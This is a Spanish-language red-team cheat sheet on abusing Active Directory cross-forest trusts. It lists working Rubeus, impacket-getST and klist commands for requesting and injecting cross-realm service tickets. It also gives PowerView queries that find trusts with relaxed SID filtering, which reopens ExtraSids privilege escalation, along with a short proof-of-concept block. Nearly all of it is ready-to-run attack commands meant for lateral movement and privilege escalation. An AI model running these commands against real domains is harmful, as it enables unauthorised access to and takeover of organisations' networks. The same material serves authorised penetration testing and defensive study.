---
aliases:
  - Cross-Realm TGS
  - SID Filtering Bypass
tags:
  - technique/lateral-movement
  - technique/privilege-escalation
  - asset/active-directory
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Active Directory]]"
tertiary categories:
  - "[[Active Directory Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Inter-Forest Trust Abuse]]"
  - "[[Intra-Forest Trust Abuse]]"
---
# Inter-Forest Trust Abuse - Cross-Realm

> Con tu TGT podés pedir tickets de servicio hacia el forest confiado (cross-realm). Si el trust tiene SID filtering **relajado** (TGTDelegation/SIDHistory), reabre el truco de ExtraSids cross-forest.

---

## Cross-Realm TGS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Rubeus.exe asktgs /service:cifs/dc.target.forest /ticket:<referral-TGT>` | TGS hacia un servicio del forest confiado | Acceso cross-forest con tu TGT. |
| `impacket-getST -spn cifs/dc.target.forest -k -no-pass corp.local/user` | TGS cross-realm (Linux) | Alternativa. |
| `klist get cifs/dc.target.forest` | Pedir referral + TGS al otro forest | Validación rápida. |
^inter-crossrealm-tgs

## Verificar SID Filtering Relajado

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---|:---|:---|
| `Get-DomainTrust \| ? {$_.TrustAttributes -band 0x800}` | Trusts con **TGTDelegation** habilitado | Reabre ExtraSids cross-forest. |
| `Get-DomainTrust \| ? {$_.TrustAttributes -match 'TREAT_AS_EXTERNAL'}` | Trust tratado como external (quarantine off) | SID filtering relajado. |
| `nltest /domain_trusts /all_trusts /v` | Atributos verbosos del trust | Confirmar configuración. |
^inter-crossrealm-sidfilter

### PoC

```powershell
# Si TGTDelegation está ON, ExtraSids vuelve a funcionar cross-forest
Get-DomainTrust | ? { $_.TrustAttributes -band 0x800 }
# Cross-realm: usar TGT propio para pedir TGS al otro forest
Rubeus.exe asktgs /service:cifs/dc.target.forest /ticket:referral.kirbi /ptt
```

> [!warning] SID filtering
> Por default, inyectar un SID privilegiado del otro forest en ExtraSids es **filtrado** → no escala. Solo funciona si el trust está mal configurado (quarantine off / TGTDelegation on). Verificá `TrustAttributes` antes de intentar. Intra-forest no tiene esta protección ([[Intra-Forest Trust Abuse]]).
